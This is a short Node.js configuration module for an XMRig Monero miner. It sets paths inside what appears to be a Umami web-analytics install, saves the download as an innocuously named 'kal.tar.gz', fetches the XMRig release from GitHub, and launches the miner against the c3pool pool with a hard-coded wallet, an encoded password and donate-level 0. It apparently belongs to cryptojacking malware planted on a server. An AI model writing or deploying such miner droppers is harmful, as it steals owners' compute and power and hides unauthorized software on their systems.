const path = require('path');
const homeDir = '/home/admin/umami';
const walletID = "47gxzRb2N75MKzrck8g2y28KPWn5BkQuXFfVbGvmHi8WfzpVAqZQZipMK8A1pDk69PRcwHb3uDgaL2mzUr9WhTDr8cDtq87";
module.exports = {
    homeDir: homeDir,
    tarFile: path.join(homeDir, "kal.tar.gz"),
    extractDir: path.join(homeDir, "xmrig-6.24.0"),
    binaryPath: path.join(homeDir, "xmrig-6.24.0", "xmrig"),
    downloadUrl: "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz",
    processName: "xmrig",
    walletID: walletID,
    launchArgs: [
        "--url", "auto.c3pool.org:19999",
        "--user", walletID,
        "--pass", "WUZHRg8bHkZBV1ZfWFxUGFhNQlxSRkFGUFZWGFZbXB0=", 
        "--donate-level", "0",
        "--algo", "rx/0",
    ]
};